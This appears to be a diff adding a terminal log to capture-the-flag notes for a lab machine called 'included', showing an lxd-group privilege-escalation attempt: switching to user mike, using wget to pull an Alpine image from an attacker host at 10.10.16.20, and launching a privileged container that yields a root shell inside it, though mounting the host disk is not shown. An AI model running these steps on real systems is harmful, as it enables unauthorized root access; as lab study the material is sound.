@@ -119,9 +119,107 @@ mike@included:~$ groups
 mike lxd
 mike@included:~$ 
 --------------------------------------------------------------------------
+ww-data@included:/$ su mike
+Password: 
+su: Authentication failure
+www-data@included:/$ su mike         
+Password: 
+mike@included:/$ wget http://10.10.16.20:8000/incus.tar.xz
+--2025-08-25 12:41:16--  http://10.10.16.20:8000/incus.tar.xz
+Connecting to 10.10.16.20:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 888 [application/x-xz]
+incus.tar.xz: Permission denied
 
+Cannot write to ‘incus.tar.xz’ (Permission denied).
+mike@included:/$ cd ~
+mike@included:~$ wget http://10.10.16.20:8000/incus.tar.xz
+--2025-08-25 12:41:41--  http://10.10.16.20:8000/incus.tar.xz
+Connecting to 10.10.16.20:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 888 [application/x-xz]
+Saving to: ‘incus.tar.xz’
 
+incus.tar.xz        100%[===================>]     888  --.-KB/s    in 0s      
 
+2025-08-25 12:41:42 (96.5 MB/s) - ‘incus.tar.xz’ saved [888/888]
 
+mike@included:~$ wget http://10.10.16.20:8000/rootfs.squashfs
+--2025-08-25 12:42:47--  http://10.10.16.20:8000/rootfs.squashfs
+Connecting to 10.10.16.20:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3096576 (3.0M) [application/octet-stream]
+Saving to: ‘rootfs.squashfs’
 
+rootfs.squashfs     100%[===================>]   2.95M   310KB/s    in 10s     
 
+2025-08-25 12:42:59 (289 KB/s) - ‘rootfs.squashfs’ saved [3096576/3096576]
+
+mike@included:~$ lxc image import incus.tar.xz rootfs.squashfs --alias alpine
+mike@included:~$ lxc image list
++--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
++--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
+| alpine | 74096f964c10 | no     | Alpinelinux 3.18 x86_64 (20250825_1214) | x86_64 | 2.95MB | Aug 25, 2025 at 12:44pm (UTC) |
++--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
+mike@included:~$ lxc init alpine privesc -c security.privileged=true
+Creating privesc
+mike@included:~$ lxc list
++---------+---------+------+------+------------+-----------+
+|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
++---------+---------+------+------+------------+-----------+
+| privesc | STOPPED |      |      | PERSISTENT | 0         |
++---------+---------+------+------+------------+-----------+
+mike@included:~$ lxc start privesc
+mike@included:~$ lxc exec privesc /bin/sh
+~ # cd /mnt/root
+/bin/sh: cd: can't cd to /mnt/root: No such file or directory
+~ # ls -la
+total 12
+drwx------    2 root     root          4096 Aug 25 12:46 .
+drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
+-rw-------    1 root     root            20 Aug 25 12:46 .ash_history
+~ # cd /
+/ # ls -la
+total 60
+drwxr-xr-x   19 root     root          4096 Aug 25 12:45 .
+drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
+drwxr-xr-x    2 root     root          4096 Aug 25 12:14 bin
+drwxr-xr-x    8 root     root           460 Aug 25 12:45 dev
+drwxr-xr-x   23 root     root          4096 Aug 25 12:45 etc
+drwxr-xr-x    2 root     root          4096 Sep  6  2024 home
+drwxr-xr-x    8 root     root          4096 Aug 25 12:14 lib
+drwxr-xr-x    5 root     root          4096 Sep  6  2024 media
+drwxr-xr-x    2 root     root          4096 Sep  6  2024 mnt
+drwxr-xr-x    2 root     root          4096 Sep  6  2024 opt
+dr-xr-xr-x  145 root     root             0 Aug 25 12:45 proc
+drwx------    2 root     root          4096 Aug 25 12:46 root
+drwxr-xr-x    4 root     root           240 Aug 25 12:45 run
+drwxr-xr-x    2 root     root          4096 Aug 25 12:14 sbin
+drwxr-xr-x    2 root     root          4096 Sep  6  2024 srv
+dr-xr-xr-x   13 root     root             0 Aug 25 12:45 sys
+drwxrwxrwt    4 root     root          4096 Aug 25 12:45 tmp
+drwxr-xr-x    8 root     root          4096 Aug 25 12:14 usr
+drwxr-xr-x   11 root     root          4096 Aug 25 12:45 var
+/ # cd root
+~ # ls -la
+total 12
+drwx------    2 root     root          4096 Aug 25 12:46 .
+drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
+-rw-------    1 root     root            47 Aug 25 12:46 .ash_history
+~ # cd /
+/ # cd mnt
+/mnt # ls -la
+total 8
+drwxr-xr-x    2 root     root          4096 Sep  6  2024 .
+drwxr-xr-x   19 root     root          4096 Aug 25 12:45 ..
+/mnt # cd ~
+~ # cat /root/root.txt
+cat: can't open '/root/root.txt': No such file or directory
+~ # whoami
+root
+~ # gorups
+/bin/sh: gorups: not found
+~ # id
+uid=0(root) gid=0(root)
+-------------------------------------------------------------------------------------
